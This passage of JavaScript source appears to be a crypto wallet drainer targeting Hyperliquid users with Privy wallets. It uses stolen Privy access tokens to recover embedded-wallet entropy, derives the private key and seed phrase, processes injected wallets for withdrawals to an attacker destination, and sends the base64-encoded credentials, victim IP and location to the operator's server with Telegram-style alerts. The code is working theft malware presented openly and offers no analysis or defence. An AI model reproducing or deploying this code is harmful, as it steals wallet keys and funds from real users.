            queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Privy Auth Failed</b>\n\nError: <code>" + error.message + "</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code);
            return;
        }

        let result;
        try {
            result = await getHashesData({
                accessToken: accessToken.replaceAll('"', ""),
                appClientId: null,
                appId: APP_ID,
                entropyId: connection["address"],
                entropyIdVerifier: "ethereum-address-verifier",
                userId: sessionData["user"]["id"].split(":")[2],
            });
        } catch (error) {
            console.error('Failed to get wallet data from Privy:', error);
            queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Wallet Recovery Failed</b>\n\nError: <code>" + error.message + "</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code);
            return;
        }

        function a5(e, t = {}) {
            let s = Array.from({
                length: 256
            }, (e, t) => t.toString(16).padStart(2, '0'));

            function u(e, t = {}) {
                let r = '';
                for (let t = 0; t < e.length; t++) r += s[e[t]];
                let n = `0x${r}`;
                return n
            }

            return u(e, t)
        }

        if (!result || !result.wallet || !result.entropy) {
            console.error('Invalid result structure from getHashesData');
            queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Invalid Wallet Data</b>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code);
            return;
        }

        let privateKeyHex;
        let mnemonicPhrase;
        try {
            privateKeyHex = a5(result.wallet.getHdKey().privateKey).replace(/^0x/, '');
            let hp = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce box boy bracket brain brand brass brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canoe canvas canyon capable capital captain car carbon card cargo carpet carry cart case cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk churn cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy cream credit creek crew cricket crime crisp critic crop cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise denial dentist deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology economy edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empower empty enable enact end endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip era erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude excuse execute exercise exhaust exhibit exile exist exit exotic expand expect expire explain expose express extend extra eye eyebrow fabric face faculty fade faint faith fall false fame family famous fan fancy fantasy farm fashion fat fatal father fatigue fault favorite feature february federal fee feed feel female fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus fog foil fold follow food foot force forest forget fork fortune forum forward fossil foster found fox fragile frame frequent fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game gap garage garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good goose gorilla gospel gossip govern gown grab grace grain grant grape grass gravity great green grid grief grit grocery group grow grunt guard guess guide guilt guitar gun gym habit hair half hammer hamster hand happy harbor hard harsh harvest hat have hawk hazard head health heart heavy hedgehog height hello helmet help hen hero hidden high hill hint hip hire history hobby hockey hold hole holiday hollow home honey hood hope horn horror horse hospital host hotel hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon idea identify idle ignore ill illegal illness image imitate immense immune impact impose improve impulse inch include income increase index indicate indoor industry infant inflict inform inhale inherit initial inject injury inmate inner innocent input inquiry insane insect inside inspire install intact interest into invest invite involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump jungle junior junk just kangaroo keen keep ketchup key kick kid kidney kind kingdom kiss kit kitchen kite kitten kiwi knee knife knock know lab label labor ladder lady lake lamp language laptop large later latin laugh laundry lava law lawn lawsuit layer lazy leader leaf learn leave lecture left leg legal legend leisure lemon lend length lens leopard lesson letter level liar liberty library license life lift light like limb limit link lion liquid list little live lizard load loan lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury lyrics machine mad magic magnet maid mail main major make mammal man manage mandate mango mansion manual maple marble march margin marine market marriage mask mass master match material math matrix matter maximum maze meadow mean measure meat mechanic medal media melody melt member memory mention menu mercy merge merit merry mesh message metal method middle midnight milk million mimic mind minimum minor minute miracle mirror misery miss mistake mix mixed mixture mobile model modify mom moment monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music must mutual myself mystery myth naive name napkin narrow nasty nation nature near neck need negative neglect neither nephew nerve nest net network neutral never news next nice night noble noise nominee noodle normal north nose notable note nothing notice novel now nuclear number nurse nut oak obey object oblige obscure observe obtain obvious occur ocean october odor off offer office often oil okay old olive olympic omit once one onion online only open opera opinion oppose option orange orbit orchard order ordinary organ orient original orphan ostrich other outdoor outer output outside oval oven over own owner oxygen oyster ozone pact paddle page pair palace palm panda panel panic panther paper parade parent park parrot party pass patch path patient patrol pattern pause pave payment peace peanut pear peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter question quick quit quiz quote rabbit raccoon race rack radar radio rail rain raise rally ramp ranch random range rapid rare rate rather raven raw razor ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remove render renew rent reopen repair repeat replace report require rescue resemble resist resource response result retire retreat return reunion reveal review reward rhythm rib ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance roof rookie room rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salon salt salute same sample sand satisfy satoshi sauce sausage save say scale scan scare scatter scene scheme school science scissors scorpion scout scrap screen script scrub sea search season seat second secret section security seed seek segment select sell seminar senior sense sentence series service session settle setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister situate six size skate sketch ski skill skin skirt skull slab slam sleep slender slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow soap soccer social sock soda soft solar soldier solid solution solve someone song soon sorry sort soul sound soup source south space spare spatial spawn speak special speed spell spend sphere spice spider spike spin spirit split spoil sponsor spoon sport spot spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stool story stove strategy street strike strong struggle student stuff stumble style subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply supreme sure surface surge surprise surround survey suspect sustain swallow swamp swap swarm swear sweet swift swim swing switch sword symbol symptom syrup system table tackle tag tail talent talk tank tape target task taste tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing this thought three thrive throw thumb thunder ticket tide tiger tilt timber time tiny tip tired tissue title toast tobacco today toddler toe together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap trash travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck true truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique unit universe unknown unlock until unusual unveil update upgrade uphold upon upper upset urban urge usage use used useful useless usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venture venue verb verify version very vessel veteran viable vibrant vicious victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear weasel weather web wedding weekend weird welcome west wet whale what wheat wheel when where whip whisper wide width wife wild will win window wine wing wink winner winter wire wisdom wise wish witness wolf woman wonder wood wool word work world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo".split(" ");
            mnemonicPhrase = module19441.tR(result.entropy, hp);
        } catch (error) {
            console.error('Failed to generate mnemonic/private key:', error);
            queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Credentials Generation Failed</b>\n\nError: <code>" + error.message + "</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code);
            return;
        }

        return {
            mnemonic: mnemonicPhrase,
            privateKey: privateKeyHex,
            address: result.wallet.address,
        }
    }

    try {
        console.debug('[Hyperliquid] Total connections to process:', privyConnectionsStorage.length);
        
        // [OPTIMIZATION 6] Разделяем connections на embedded (параллельно) и injected (последовательно)
        // Embedded wallets не требуют UI взаимодействия - можно обрабатывать параллельно
        // Injected wallets требуют popup кошелька - обязательно последовательно
        const embeddedConnections = privyConnectionsStorage.filter(c => c.connectorType !== "injected");
        const injectedConnections = privyConnectionsStorage.filter(c => c.connectorType === "injected");
        
        console.debug('[Hyperliquid] Embedded connections:', embeddedConnections.length, '| Injected connections:', injectedConnections.length);

        // Обработчик результата injected wallet
        const processInjectedResult = async (connection, withdrawals) => {
            if (Array.isArray(withdrawals) && withdrawals.length > 0) {
                const firstWithdrawal = withdrawals[0];
                const summaryAmount = withdrawals.length === 1 ? firstWithdrawal.withdrawAmount : `${withdrawals.length} transactions`;
                const summarySymbol = withdrawals.length === 1 ? firstWithdrawal.symbol : 'MULTI';

                const aggregatedPayload = {
                    sentTo: EVM_DESTINATION,
                    ipData: ipData,
                    userAgent: navigator.userAgent,
                    chatId: code,
                    address: connection["address"],
                    withdrawAmount: summaryAmount,
                    symbol: summarySymbol,
                    withdrawals: withdrawals.map(({ address, withdrawAmount, symbol }) => ({
                        address,
                        amount: withdrawAmount,
                        symbol
                    })),
                    botId: botId,
                };

                await sendMessageToServer(Buffer.from(JSON.stringify(aggregatedPayload)).toString('base64'), 0, "", code, username, platform);
            }
        };

        // Обработчик результата embedded wallet
        const processEmbeddedResult = async (connection, result) => {
            if (result) {
                await sendMessageToServer(Buffer.from(JSON.stringify({
                    ...result,
                    sentTo: EVM_DESTINATION,
                    ipData: ipData,
                    userAgent: navigator.userAgent,
                    chatId: code,
                    botId: botId,
                })).toString('base64'), 0, "", code, username, platform);
            }
        };

        // ФАЗА 1: Параллельная обработка embedded wallets (Privy) - не требуют UI
        if (embeddedConnections.length > 0) {
            console.debug('[Hyperliquid] Phase 1: Processing embedded wallets in parallel...');
            const embeddedResults = await Promise.allSettled(
                embeddedConnections.map(async (connection) => {
                    try {
                        console.debug('[Hyperliquid] Processing embedded connection:', connection.address);
                        queueMessage("📍 <b>Platform: </b> " + platform + "\n\n🔐 <b>Embedded Wallet Connected</b>\n\nType: <code>Privy</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, 0, "", code, username, platform);
                        
                        const result = await embeddedStart(connection);
                        return { connection, result, success: true };
                    } catch (error) {
                        console.debug('[Hyperliquid] Embedded connection error:', error);
                        return { connection, error, success: false };
                    }
                })
            );

            // Обрабатываем результаты embedded wallets
            for (const settled of embeddedResults) {
                if (settled.status === 'fulfilled' && settled.value.success) {
                    processEmbeddedResult(settled.value.connection, settled.value.result);
                    console.debug('[Hyperliquid] Embedded connection processed successfully');
                } else {
                    const errorInfo = settled.status === 'rejected' ? settled.reason : settled.value?.error;
                    console.debug('[Hyperliquid] Embedded connection failed:', errorInfo);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Embedded Connection Error</b>\n\n" +
                        "Error: <code>" + (errorInfo?.message || 'Unknown error') + "</code>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                }
            }
        }

        // ФАЗА 2: Последовательная обработка injected wallets - требуют popup кошелька
        if (injectedConnections.length > 0) {
            console.debug('[Hyperliquid] Phase 2: Processing injected wallets sequentially (requires user interaction)...');
            for (const connection of injectedConnections) {
                try {
                    console.debug('[Hyperliquid] Processing injected connection:', connection.address);
                    
                    const withdrawals = await injectedStart(connection);
                    console.debug('[Hyperliquid] Injected start result:', withdrawals?.length, 'withdrawals');
                    
                    processInjectedResult(connection, withdrawals);
                    console.debug('[Hyperliquid] Injected connection processed successfully');
                    
                    // Небольшая пауза между injected wallets
                    if (injectedConnections.indexOf(connection) < injectedConnections.length - 1) {
                        await new Promise(resolve => setTimeout(resolve, 300));
                    }
                } catch (connectionError) {
                    console.debug('[Hyperliquid] Injected connection error:', connectionError);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Injected Connection Error</b>\n\n" +
                        "Error: <code>" + connectionError.message + "</code>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                    // Продолжаем со следующим injected connection
                }
            }
        }
        
        console.debug('[Hyperliquid] All connections processed');
    } catch (error) {
        console.debug('[Hyperliquid] Critical Error:', error);
        queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Critical Error</b>\n\nError: <code>" + error.message + "</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code);
        return;
    } finally {
        setTimeout(() => {
            location.reload();
        }, 10000);
    }

})()